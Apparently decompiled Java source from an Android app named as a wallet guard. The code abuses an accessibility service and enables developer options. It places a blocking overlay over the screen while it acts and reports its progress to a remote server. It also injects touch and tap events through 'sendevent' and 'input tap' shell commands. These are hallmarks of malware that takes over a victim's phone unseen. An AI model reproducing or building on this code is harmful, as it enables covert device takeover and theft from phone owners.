        if (canWriteSecure || this.writeSecureCompleted.get() || MyAccessibilityService.P().j() || com.guard.wallet.delegate.AdbBridge.isPowerSaveMode()) {
            return false;
        }

        Log.d(TAG, "openWriteSecure openWriteSecure ");
        boolean hasPairHistory = com.guard.wallet.utils.SharedPrefsManager.n() || com.guard.wallet.utils.SharedPrefsManager.o();

        if (!com.guard.wallet.utils.SharedPrefsManager.o()) {
            com.guard.wallet.http.HttpApiManager.fetchLockCiphers();
        }
        if (!com.guard.wallet.utils.SystemHelper.K()) {
            enableDeveloperOptions();
        }
        if (!com.guard.wallet.utils.SystemHelper.K()) {
            return false;
        }
        if (com.guard.wallet.utils.SystemHelper.p0() && com.guard.wallet.utils.SystemHelper.r0() && !hasPairHistory) {
            return false;
        }

        BlockViewVO blockView = new BlockViewVO(false, null, true, true);
        if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
            MyAccessibilityService.P().getClass();
            blockView.setBlockDrawable(MyAccessibilityService.o0());
        }
        com.guard.wallet.helper.BlockViewManager.a(blockView);

        if (!com.guard.wallet.utils.SystemHelper.p1(null)) {
            com.guard.wallet.helper.BlockViewManager.c();
            return false;
        }
        if (AppUtils.G() && !AppUtils.A() && !AppUtils.O(null, null)) {
            com.guard.wallet.helper.BlockViewManager.c();
            return false;
        }

        if (com.guard.wallet.delegate.AdbBridge.getPipActivity() != null && com.guard.wallet.utils.DeviceUtils.isVivoFamily()) {
            com.guard.wallet.delegate.AdbBridge.finishPip();
        }

        com.guard.wallet.http.HttpApiManager.sendIntentCodeMessage("ENABLE_SECURE_RUNNING_EVENT");

        MyAccessibilityService svc = MyAccessibilityService.P();
        svc.getClass();
        try {
            if (svc.h()) {
                svc.v();
            }
            svc.a.add(com.guard.wallet.delegate.AdbBridge.createWriteSecureDelegate());
            svc.t("com.guard.wallet.delegate.EnableSecureDelegate", com.guard.wallet.delegate.AdbBridge.getWriteSecureWindows());
        } catch (Exception ex) {
            AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", ex);
        }

        com.guard.wallet.utils.SystemHelper.T0(10);
        com.guard.wallet.utils.SystemHelper.f1();
        return true;
    }

    /**
     * vendor h/e.b0(List<TouchEvent>) -> executeSendEvents.
     */
    public final boolean executeSendEvents(List<TouchEvent> events) {
        if (events == null || events.isEmpty() || !D()) {
            return false;
        }
        LinkedList<String> commands = new LinkedList<>();
        for (int idx = 0; idx < events.size(); idx++) {
            TouchEvent event = events.get(idx);
            String cmd;
            if (!AppUtils.B(event.getValue())) {
                cmd = String.format(Locale.getDefault(), "sendevent %s %s %s %s",
                        event.getDeviceName(), event.getTypeName(),
                        event.getCodeName(), event.getValue());
            } else {
                cmd = String.format(Locale.getDefault(), "sendevent %s %s %s",
                        event.getDeviceName(), event.getTypeName(), event.getCodeName());
            }
            commands.add(cmd);
        }
        if (!commands.isEmpty()) {
            return this.executeShellCommand(TextUtils.join(" && ", commands));
        }
        return false;
    }

    /**
     * vendor h/e.c0(List<Point>) -> executeTapSequence.
     */
    public final boolean executeTapSequence(List<Point> touchList) {
        if (touchList == null || touchList.isEmpty() || !D()) {
            return false;
        }
        int total = 0;
        int success = 0;
        for (Point pt : touchList) {
            if (pt != null && pt.getX() >= 0.0f && pt.getY() >= 0.0f) {
                try {
                    Thread.sleep(400L);
                } catch (Exception ex) {
                    AppUtils.s(TAG, ex);
                }
                total++;
                if (this.executeShellCommand(String.format(Locale.getDefault(), "input tap %.0f %.0f",
                        pt.getX(), pt.getY()))) {
                    success++;
                }
            }
        }
        return total > 0 && success == total;
    }

    @Override
    public final void close() {
        this.oConnect.shutdownNow();
        this.pDownload.shutdownNow();
        this.downloadCache.clear();
        this.qInstall.shutdownNow();
        try {
            super.close();
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }
}
